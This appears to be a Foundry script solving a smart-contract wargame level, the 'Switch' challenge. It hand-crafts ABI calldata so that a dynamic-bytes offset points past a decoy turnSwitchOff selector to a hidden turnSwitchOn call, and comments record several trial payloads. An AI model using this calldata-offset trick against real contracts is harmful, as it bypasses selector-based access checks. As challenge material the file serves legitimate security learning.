// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level29.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attck {
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
    Switch public switchCont =
        Switch(payable(0x23DD9da2FF28551Ba5f09BafaE4c9348bEdAbD2C));

    function gogo() external {
        /** ON : 0x76227e12 OFF : 0x20606e15 */

        bytes memory payload = abi.encodePacked(
            hex"30c13ade",
            hex"0000000000000000000000000000000000000000000000000000000000000060",
            hex"0000000000000000000000000000000000000000000000000000000000000000",
            hex"20606e1500000000000000000000000000000000000000000000000000000000",
            hex"0000000000000000000000000000000000000000000000000000000000000004",
            hex"76227e1200000000000000000000000000000000000000000000000000000000"
        );
        bytes memory callinput = abi.encodeWithSelector(
            switchCont.flipSwitch.selector,
            switchCont.turnSwitchOff.selector
            // payload
        );

        console.log("input");
        console.logBytes(payload);
        /**

0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000020 // => hex"20" => 32
0000000000000000000000000000000000000000000000000000000000000004 
20606e1500000000000000000000000000000000000000000000000000000000
=> 단순히 20606e15 만 실행



0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000040 
0000000000000000000000000000000000000000000000000000000000000004 
20606e1500000000000000000000000000000000000000000000000000000000
76227e12
// =>  panic: memory allocation error (0x41) 

0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000038 
0000000000000000000000000000000000000000000000000000000476227e12 
20606e1500000000000000000000000000000000000000000000000000000000




0x30c13ade
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000000
20606e1500000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000004
76227e1200000000000000000000000000000000000000000000000000000000





 */
        address(switchCont).call(payload);
    }
}
contract SwitchSolution is Script {
    Switch public switchCont =
        Switch(payable(0x23DD9da2FF28551Ba5f09BafaE4c9348bEdAbD2C));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes memory turnSwitchOffData = abi.encodeWithSelector(
            switchCont.turnSwitchOff.selector
        );
        bytes memory turnSwitchOnData = abi.encodeWithSelector(
            switchCont.turnSwitchOn.selector
        );
        console.log("before => ", switchCont.switchOn());

        console.log("ON : 0x76227e12");
        console.log("OFF : 0x20606e15");
        Attck attack = new Attck();
        attack.gogo();

        console.log("after => ", switchCont.switchOn());

        vm.stopBroadcast();
    }
}
